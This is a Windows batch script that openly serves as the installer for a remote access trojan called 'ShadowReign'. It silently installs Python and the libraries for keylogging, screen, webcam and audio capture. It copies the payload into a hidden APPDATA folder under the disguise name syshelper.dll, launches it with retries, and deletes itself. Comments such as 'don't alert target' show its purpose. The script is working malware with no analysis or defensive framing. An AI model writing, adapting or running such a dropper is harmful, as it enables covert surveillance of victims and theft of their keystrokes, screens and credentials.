@echo off
REM Silent and invisible
>nul 2>&1

REM Minimize window instantly
if not defined minimized (
    set minimized=1
    start "" /min "%~f0" %*
    exit /b
)

REM Check Python silently
python --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    REM Download and install Python silently
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe' -OutFile '%TEMP%\py_setup.exe'" >nul 2>&1
    %TEMP%\py_setup.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0 >nul 2>&1
    del %TEMP%\py_setup.exe >nul 2>&1
    timeout /t 10 /nobreak >nul 2>&1
)

REM Update PATH for this session
set "PATH=%USERPROFILE%\AppData\Local\Programs\Python\Python311;%USERPROFILE%\AppData\Local\Programs\Python\Python311\Scripts;%PATH%"

REM Verify Python
python --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    REM Silent exit if Python fails—don’t alert target
    exit /b 1
)

REM Ensure pip is ready
python -m ensurepip --upgrade >nul 2>&1
python -m pip install --upgrade pip --quiet >nul 2>&1

REM Install all ShadowReign dependencies silently
python -m pip install pynput mss opencv-python pyaudio pyttsx3 psutil pycryptodome numpy pillow pywin32 requests --quiet >nul 2>&1

REM Set hidden directory and payload name
set "HIDDEN_DIR=%APPDATA%\Microsoft\Crypto"
set "PAYLOAD_NAME=syshelper.dll"

REM Move script and payload to hidden location if not already there
if not "%~dp0"=="%HIDDEN_DIR%\" (
    mkdir "%HIDDEN_DIR%" >nul 2>&1
    attrib +h "%HIDDEN_DIR%" >nul 2>&1
    copy "%~f0" "%HIDDEN_DIR%\setup.bat" >nul 2>&1
    copy "shadowreign.py" "%HIDDEN_DIR%\%PAYLOAD_NAME%" >nul 2>&1
    attrib +h "%HIDDEN_DIR%\%PAYLOAD_NAME%" >nul 2>&1
    REM Run from new location and delete original
    start "" /b "%HIDDEN_DIR%\setup.bat"
    del "%~f0" >nul 2>&1
    exit /b 0
)

REM Launch RAT silently and verify it’s running
set "ATTEMPTS=0"
:launch_loop
start "" /b pythonw "%HIDDEN_DIR%\%PAYLOAD_NAME%" >nul 2>&1
timeout /t 2 /nobreak >nul 2>&1

REM Check if pythonw is running with our payload
tasklist /FI "IMAGENAME eq pythonw.exe" /FO CSV | find "%PAYLOAD_NAME%" >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    REM Success—RAT is running
    goto :cleanup
)

REM Retry up to 3 times if not running
set /a ATTEMPTS+=1
if %ATTEMPTS% LSS 3 (
    timeout /t 2 /nobreak >nul 2>&1
    goto :launch_loop
)

REM If still not running, exit silently—don’t alert target
exit /b 1

:cleanup
REM Self-delete after confirming run
timeout /t 2 /nobreak >nul 2>&1
del "%~f0" >nul 2>&1

exit /b 0
